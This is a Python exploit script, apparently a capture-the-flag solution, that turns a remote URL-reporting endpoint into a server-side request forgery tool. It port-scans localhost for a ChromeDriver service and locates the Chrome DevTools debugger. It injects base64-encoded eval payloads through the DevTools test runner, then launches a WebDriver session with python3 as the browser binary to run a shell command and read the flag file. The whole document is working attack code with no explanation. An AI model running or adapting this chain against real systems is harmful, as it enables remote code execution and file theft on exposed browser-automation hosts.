import requests
from multiprocessing import Pool
from tqdm import tqdm
from itertools import islice
import json
from threading import Thread
import base64
import sys

REMOTE_URL = sys.argv[1]


def do_test(ports):
    r = requests.post(
        f"{REMOTE_URL}report",
        json=[f"http://localhost:{port}/sessions" for port in ports],
    ).json()
    for i, x in enumerate(r["ret"]):
        if "webauthn:extension:credBlob" in x:
            return ports[i]


n = 4
k = 400
# LAST_PORT 32768
# FIRST_PORT 1024
# Math.abs(randomInt % (LAST_PORT - FIRST_PORT + 1)) + FIRST_PORT
SCAN_RANGE = range(1024, 32768)
i = iter(SCAN_RANGE)

with Pool(n) as p:
    for result in tqdm(
        p.imap_unordered(
            do_test, (tuple(islice(i, k)) for _ in range(len(SCAN_RANGE) // k))
        ),
        total=len(SCAN_RANGE) // k,
    ):
        if result:
            p.terminate()
            break

webdriver_port = result

print(f"found webdriver@{webdriver_port}")


# i have 100s to do the exploit
def keep_open():
    print("spawn instance to keep open")
    r = requests.post(
        f"{REMOTE_URL}report",
        json=[f"http://localhost:80" for i in range(100)],
    )


def get_content(url):
    return requests.post(
        f"{REMOTE_URL}report",
        json=[url],
    ).json()[
        "ret"
    ][0]


t = Thread(target=keep_open)
t.daemon = True
t.start()

r = get_content(f"http://localhost:{webdriver_port}/sessions")

data = json.loads(r.split("<pre>")[1].split("</pre>")[0])

urls = []
for session in data["value"]:
    urls.append(f"http://localhost:{webdriver_port}/session/{session['id']}/url")

r = requests.post(
    f"{REMOTE_URL}report",
    json=urls,
).json()["ret"]

for i, x in enumerate(r):
    url = json.loads(x.split("<pre>")[1].split("</pre>")[0])["value"]
    print(url)
    if url == f"http://localhost/":
        break
else:
    print("not found :(")
    exit(1)

debugger_address = data["value"][i]["capabilities"]["goog:chromeOptions"][
    "debuggerAddress"
]

print(f"http://{debugger_address}/json")

r = get_content(f"http://{debugger_address}/json")

data = json.loads(r.split("<pre>")[1].split("</pre>")[0])

url = f"http://{debugger_address}{data[0]['devtoolsFrontendUrl']}"

print("open permanent page with correct origin")
payload = base64.b64encode(
    base64.b64encode(
        f"""
window.open("http://{debugger_address}/json", "_blank")
""".encode()
    )
).decode()
get_content(
    f"{url.replace('inspector.html', 'integration_test_runner.html')}&test=http://localo.ooo/%3f${{eval(atob(atob(`{payload}`)))}}"
)

import time

time.sleep(1)

r = get_content(f"http://{debugger_address}/json")

data = json.loads(r.split("<pre>")[1].split("</pre>")[0])
for x in data:
    print(x)
    if x["url"] == f"http://{debugger_address}/json":
        break
else:
    print("not found :(")
    exit(1)
print("got permanent page")

url = f"http://{debugger_address}{x['devtoolsFrontendUrl']}"

print("executing /readflag")
payload = base64.b64encode(
    base64.b64encode(
        f"""
fetch("http://localhost:{webdriver_port}/session", {{
  body: `{{"capabilities":{{"alwaysMatch":{{"goog:chromeOptions":{{"binary": "/nix/store/pzf6dnxg8gf04xazzjdwarm7s03cbrgz-python3-3.10.12/bin/python3", "args": ["-c__import__('os').system('/readflag > /tmp/flag')"]}}}}}}}}`,
  headers: {{
    "Content-Type": "application/x-www-form-urlencoded"
  }},
  method: "POST"
}})
setTimeout(()=>{{
    fetch("http://{debugger_address}/json/new?file:///tmp/flag", {{method: "PUT"}})
}}, 1000)
""".encode()
    )
).decode()


r = get_content(
    f"{url.replace('inspector.html', 'integration_test_runner.html')}&test=http://localo.ooo/%3f${{eval(atob(atob(`{payload}`)))}}"
)

time.sleep(2)

print("Setting page title to flag content")
r = get_content(f"http://{debugger_address}/json")
c = 0

data = json.loads(r.split("<pre>")[1].split("</pre>")[0])
for x in data:
    if x["url"] == f"file:///tmp/flag":
        break
else:
    print("not found :(")
    exit(1)

url = f"http://{debugger_address}{x['devtoolsFrontendUrl']}"

payload = base64.b64encode(
    base64.b64encode(
        f"""
window.name = document.body.textContent
setTimeout(()=>{{document.title=window.name}}, 1000)
""".encode()
    )
).decode()

r = get_content(
    f"{url.replace('inspector.html', 'integration_test_runner.html')}&test=http://localo.ooo/%3f${{eval(atob(atob(`{payload}`)))}}"
)

time.sleep(2)

r = get_content(f"http://{debugger_address}/json")

data = json.loads(r.split("<pre>")[1].split("</pre>")[0])
for x in data:
    if x["url"] == f"file:///tmp/flag":
        break
else:
    print("not found :(")
    exit(1)
print("got flag")
print(x["title"])

